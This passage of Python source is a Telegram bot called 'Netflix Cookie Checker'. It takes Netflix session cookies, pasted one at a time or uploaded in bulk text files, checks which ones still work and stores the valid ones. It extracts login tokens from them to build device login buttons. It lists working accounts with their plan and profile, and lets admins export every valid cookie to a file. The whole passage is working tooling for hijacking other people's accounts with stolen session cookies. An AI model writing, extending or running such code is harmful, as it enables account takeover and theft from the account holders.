        # Extract nftoken for login buttons
        cookie_doc = db.get_cookie(cookie_id)
        if cookie_doc:
            raw = denormalize_cookie(cookie_doc.get("cookie", ""))
            nftoken = extract_nftoken(raw)
            if nftoken:
                keyboard = build_login_keyboard(cookie_id, nftoken)
                await msg.edit_text(response, parse_mode="HTML", reply_markup=keyboard)
                return

        await msg.edit_text(response, parse_mode="HTML")
    else:
        response = (
            f"{format_header('Validation Failed', '❌')}\n"
            f"{SEP}\n"
            f"{status_text}\n\n"
            f"{get_emoji('⚠️')} <b>Error:</b> <code>{result.get('error', 'Unknown error')}</code>\n"
            f"{get_emoji('🆔')} <b>Cookie ID:</b> <code>{cookie_id}</code>"
        )
        await msg.edit_text(response, parse_mode="HTML")

async def handle_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return
    cookie = update.message.text.strip()
    if not validate_cookie(cookie):
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Invalid Format</b>\n\n"
            f"Use <code>/check &lt;cookie&gt;</code> or send a valid cookie.\n"
            f"Or send a <b>.txt</b> file with multiple cookies.",
            parse_mode="HTML"
        )
        return
    context.args = [cookie]
    await check_single(update, context)

# ========================== FILE HANDLER FOR BULK (FIXED) =========================
async def handle_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    document = update.message.document
    if not document:
        return

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Only .txt files are supported.</b>",
            parse_mode="HTML"
        )
        return

    # Send initial progress message
    msg = await update.message.reply_text(
        f"{get_emoji('⏳')} <b>Downloading and parsing file...</b>",
        parse_mode="HTML"
    )

    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')

        # Extract individual cookies from the text (each line)
        cookies = extract_cookies_from_text(content)
        if not cookies:
            await msg.edit_text(
                f"{get_emoji('❌')} <b>No valid cookies found</b>\n\n"
                f"No Netscape/Standard cookie lines detected.",
                parse_mode="HTML"
            )
            return

        if len(cookies) > MAX_BULK_CHECK:
            await msg.edit_text(
                f"{get_emoji('⛔️')} <b>Too Many Cookies</b>\n"
                f"Max: <code>{MAX_BULK_CHECK}</code>\n"
                f"Found: <code>{len(cookies)}</code>",
                parse_mode="HTML"
            )
            return

        total = len(cookies)
        await msg.edit_text(
            f"{get_emoji('⏳')} <b>Processing...</b>\n0 / {total}",
            parse_mode="HTML"
        )

        # Progress callback to update the same message
        async def progress_callback(current, total):
            if current % 5 == 0 or current == total:
                try:
                    await msg.edit_text(
                        f"{get_emoji('⏳')} <b>Processing...</b>\n{current} / {total}",
                        parse_mode="HTML"
                    )
                except:
                    pass

        # Run checks on all cookies
        results = await NetflixChecker.check_bulk_cookies(cookies, progress_callback=progress_callback)

        # Process results: only store valid cookies, ignore invalid
        valid_list = []  # list of dicts with id, tier, profile
        invalid_count = 0

        for result in results:
            cookie = result.get("cookie", "")
            if not cookie:
                invalid_count += 1
                continue

            if result.get("valid"):
                # Add to DB (or reuse existing)
                cookie_id = db.add_cookie(cookie, user_id)
                # Update status with details
                details = {
                    "account_tier": result.get("account_tier"),
                    "profile_name": result.get("profile_name"),
                    "profile_language": result.get("profile_language"),
                    "maturity_level": result.get("maturity_level"),
                    "expires_at": result.get("expires_at")
                }
                db.update_cookie_status(cookie_id, "valid", details)
                db.log_check(user_id, cookie_id, "valid", result)
                valid_list.append({
                    "id": cookie_id,
                    "tier": result.get("account_tier", "Unknown"),
                    "profile": result.get("profile_name", "Unknown")
                })
            else:
                invalid_count += 1
                # Do NOT store invalid cookies

        # Update user stats
        db.increment_user_stats(user_id, total, len(valid_list))
        db.update_user_activity(user_id)

        # Build final stylish message
        processed = total
        valid_count = len(valid_list)

        header = f"{format_header('Bulk Check Complete', '📊')}"
        sep = SEP

        lines = [
            header,
            sep,
            f"{get_emoji('📥')} <b>Processed:</b> <code>{processed}</code>",
            f"{get_emoji('✅')} <b>Valid:</b> <code>{valid_count}</code>"
        ]

        # List valid cookies (max 20 for readability)
        if valid_list:
            lines.append("")
            lines.append(f"{get_emoji('🆔')} <b>Valid Cookies:</b>")
            for idx, cookie_info in enumerate(valid_list[:20], 1):
                lines.append(
                    f"  {idx}. {get_emoji('⭐')} <b>ID:</b> <code>{cookie_info['id']}</code>  "
                    f"| {get_emoji('📊')} <code>{cookie_info['tier']}</code>  "
                    f"| {get_emoji('👤')} <code>{cookie_info['profile']}</code>"
                )
            if len(valid_list) > 20:
                lines.append(f"  {get_emoji('...')} <i>and {len(valid_list) - 20} more</i>")

        lines.append("")
        lines.append(f"{get_emoji('❌')} <b>Invalid/Expired:</b> <code>{invalid_count}</code>")
        lines.append("")
        lines.append(f"{get_emoji('🦇')} <b>Developer:</b> @Xalonexdev03")

        final_text = "\n".join(lines)

        # Edit the progress message to final result
        await msg.edit_text(final_text, parse_mode="HTML")

    except Exception as e:
        logger.error(f"File processing error: {e}")
        await msg.edit_text(
            f"{get_emoji('⚠️')} <b>Error</b>\n\n<code>{str(e)}</code>",
            parse_mode="HTML"
        )

async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Missing Cookie ID</b>\n\n"
            f"Usage: <code>/login &lt;cookie_id&gt;</code>\n"
            f"You can use the full ID or the first 8 characters.",
            parse_mode="HTML"
        )
        return

    user_input = args[0].strip()
    # Try to find by full ID first, then by prefix
    cookie_doc = db.get_cookie(user_input)
    if not cookie_doc:
        # Try prefix match (first 8 chars)
        cookie_doc = db.find_cookie_by_prefix(user_input)
        if not cookie_doc:
            await update.message.reply_text(
                f"{get_emoji('❌')} <b>Not Found</b>\n\n"
                f"Cookie ID <code>{user_input}</code> does not exist.\n"
                f"Use /valid to see available cookies.",
                parse_mode="HTML"
            )
            return

    if cookie_doc.get("status") != "valid":
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Invalid Cookie</b>\n\n"
            f"Status: <code>{cookie_doc.get('status')}</code>\n"
            f"Only valid cookies can generate login links.",
            parse_mode="HTML"
        )
        return

    cookie_id = cookie_doc["_id"]
    raw = denormalize_cookie(cookie_doc.get("cookie", ""))
    nftoken = extract_nftoken(raw)
    if not nftoken:
        await update.message.reply_text(
            f"{get_emoji('⚠️')} <b>No NFToken Found</b>\n\n"
            f"Could not extract <code>ct</code> parameter from this cookie.\n"
            f"Try checking the cookie again.",
            parse_mode="HTML"
        )
        return

    keyboard = build_login_keyboard(cookie_id, nftoken)
    response = (
        f"{format_header('Device Login', '🔑')}\n"
        f"{SEP}\n"
        f"{get_emoji('🆔')} <b>Cookie ID:</b> <code>{cookie_id}</code>\n"
        f"{get_emoji('👤')} <b>Profile:</b> <code>{cookie_doc.get('profile_name', 'Unknown')}</code>\n"
        f"{get_emoji('📊')} <b>Plan:</b> <code>{cookie_doc.get('account_tier', 'Unknown')}</code>\n\n"
        f"{get_emoji('📱')} <b>Choose a device to login:</b>"
    )
    await update.message.reply_text(response, parse_mode="HTML", reply_markup=keyboard)

async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    cookies = db.get_valid_cookies(limit=20)
    if not cookies:
        await update.message.reply_text(
            f"{get_emoji('📭')} <b>No Valid Cookies</b>\n\n"
            f"No valid cookies found in the database.",
            parse_mode="HTML"
        )
        return

    response = f"{format_header('Valid Cookies', '✅')}\n{SEP}\n"
    for i, cookie in enumerate(cookies[:10], 1):
        tier = cookie.get('account_tier', 'Unknown')
        profile = cookie.get('profile_name', 'Unknown')
        cid = cookie['_id']
        # Show full ID but mention first 8 for convenience
        response += (
            f"{i}. {get_emoji('⭐')} <b>Tier:</b> <code>{tier}</code>\n"
            f"   {get_emoji('👤')} <b>Profile:</b> <code>{profile}</code>\n"
            f"   {get_emoji('🆔')} ID: <code>{cid}</code>\n"
            f"   (use <code>{cid[:8]}</code> for short)\n\n"
        )

    if len(cookies) > 10:
        response += f"\n{get_emoji('...')} <i>and {len(cookies) - 10} more.</i>"

    await update.message.reply_text(response, parse_mode="HTML")

# ========================== ADMIN COMMANDS ==============================
@admin_required
async def admin_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text(
                f"{get_emoji('❌')} Usage: <code>/approve &lt;user_id&gt;</code>",
                parse_mode="HTML"
            )
            return
        user_id = int(context.args[0])
        db.create_user(user_id)
        if db.approve_user(user_id):
            await update.message.reply_text(
                f"{get_emoji('✅')} <b>User {user_id} approved.</b>",
                parse_mode="HTML"
            )
            try:
                await context.bot.send_message(
                    user_id,
                    f"{get_emoji('✅')} <b>Account Approved</b>\n\n"
                    f"You can now use the Netflix Cookie Checker bot.\n"
                    f"Use /start to get started.",
                    parse_mode="HTML"
                )
            except:
                pass
        else:
            await update.message.reply_text(
                f"{get_emoji('❌')} <b>Failed to approve user.</b>",
                parse_mode="HTML"
            )
    except ValueError:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Invalid user ID.</b>",
            parse_mode="HTML"
        )

@admin_required
async def admin_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text(
                f"{get_emoji('❌')} Usage: <code>/disapprove &lt;user_id&gt;</code>",
                parse_mode="HTML"
            )
            return
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(
                f"{get_emoji('✅')} <b>User {user_id} disapproved.</b>",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                f"{get_emoji('❌')} <b>Failed to disapprove user.</b>",
                parse_mode="HTML"
            )
    except ValueError:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Invalid user ID.</b>",
            parse_mode="HTML"
        )

@admin_required
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = list(db.users.find({"user_id": {"$ne": None}}))
    if not users:
        await update.message.reply_text(
            f"{get_emoji('📭')} <b>No users found.</b>",
            parse_mode="HTML"
        )
        return

    approved = sum(1 for u in users if u.get("approved", False))
    admins = sum(1 for u in users if u.get("is_admin", False))

    response = (
        f"{format_header('User List', '👥')}\n"
        f"{SEP}\n"
        f"{get_emoji('👤')} <b>Total:</b> <code>{len(users)}</code>\n"
        f"{get_emoji('✅')} <b>Approved:</b> <code>{approved}</code>\n"
        f"{get_emoji('👑')} <b>Admins:</b> <code>{admins}</code>\n\n"
    )

    for user in users[:15]:
        status = get_emoji('✅') if user.get("approved") else get_emoji('❌')
        if user.get("is_admin"):
            status = get_emoji('👑')
        response += f"{status} <code>{user['user_id']}</code> – Checks: <code>{user.get('total_checks', 0)}</code>\n"

    if len(users) > 15:
        response += f"\n{get_emoji('...')} <i>and {len(users) - 15} more.</i>"

    await update.message.reply_text(response, parse_mode="HTML")

@admin_required
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookies = db.get_valid_cookies()
    if not cookies:
        await update.message.reply_text(
            f"{get_emoji('📭')} <b>No valid cookies to export.</b>",
            parse_mode="HTML"
        )
        return

    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    filepath = os.path.join(EXPORT_DIR, filename)

    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("# Netflix Valid Cookies\n")
        f.write(f"# Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        for cookie in cookies:
            f.write(f"{cookie['cookie']}\n")

    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"{get_emoji('✅')} <b>{len(cookies)} valid cookies exported.</b>",
            parse_mode="HTML"
        )
    os.remove(filepath)

@admin_required
async def admin_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text(
        f"{get_emoji('🔄')} <b>Cleaning up invalid cookies...</b>",
        parse_mode="HTML"
    )
    deleted = db.delete_invalid_cookies()
    await msg.edit_text(
        f"{get_emoji('✅')} <b>Deleted {deleted} invalid/expired cookies.</b>",
        parse_mode="HTML"
    )

@admin_required
async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes, clear all", callback_data="clear_confirm"),
            InlineKeyboardButton("❌ Cancel", callback_data="clear_cancel")
        ]
    ])
    await update.message.reply_text(
        f"{get_emoji('⚠️')} <b>DANGER: Clear All Cookies</b>\n\n"
        f"This will delete ALL cookies from the database.\n"
        f"This action cannot be undone.\n\n"
        f"Are you sure?",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

async def clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "clear_confirm":
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text(
                f"{get_emoji('⛔️')} <b>Unauthorized</b>",
                parse_mode="HTML"
            )
            return
        total = db.cookies.count_documents({})
        db.cookies.delete_many({})
        await query.edit_message_text(
            f"{get_emoji('✅')} <b>Cleared {total} cookies from database.</b>",
            parse_mode="HTML"
        )
    else:
        await query.edit_message_text(
            f"{get_emoji('❌')} <b>Operation cancelled.</b>",
            parse_mode="HTML"
        )

# ========================== CALLBACK HANDLERS ===========================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "restart":
        await start(update, context)
        await query.edit_message_text(
            f"{get_emoji('🔄')} <b>Restarted.</b>\nUse /check to validate a cookie.",
            parse_mode="HTML"
        )
        return

    if data.startswith("upload_"):
        await query.edit_message_text(
            f"{get_emoji('📤')} <b>File Upload</b>\n\n"
            f"You can send a <b>.txt</b> file directly in this chat.",
            parse_mode="HTML"
        )
        return

# ========================== ERROR HANDLER ==============================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    try:
        await update.message.reply_text(
            f"{get_emoji('⚠️')} <b>Internal Error</b>\n\n"
            f"Something went wrong. Please try again later.",
            parse_mode="HTML"
        )
    except:
        pass

# ========================== MAIN ======================================
def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("login", login_command))
    application.add_handler(CommandHandler("valid", valid_cookies))

    # Admin commands
    application.add_handler(CommandHandler("approve", admin_approve))
    application.add_handler(CommandHandler("disapprove", admin_disapprove))
    application.add_handler(CommandHandler("users", admin_users))
    application.add_handler(CommandHandler("export", admin_export))
    application.add_handler(CommandHandler("cleanup", admin_cleanup))
    application.add_handler(CommandHandler("clear", admin_clear))

    # Message handler for direct cookie paste (text)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))

    # Message handler for .txt file upload (bulk) - must come before text handler
    application.add_handler(MessageHandler(filters.Document.ALL, handle_cookie_file))

    # Callback handlers
    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(upload_|restart)"))
    application.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))

    application.add_error_handler(error_handler)

    logger.info("Netflix Cookie Checker Bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()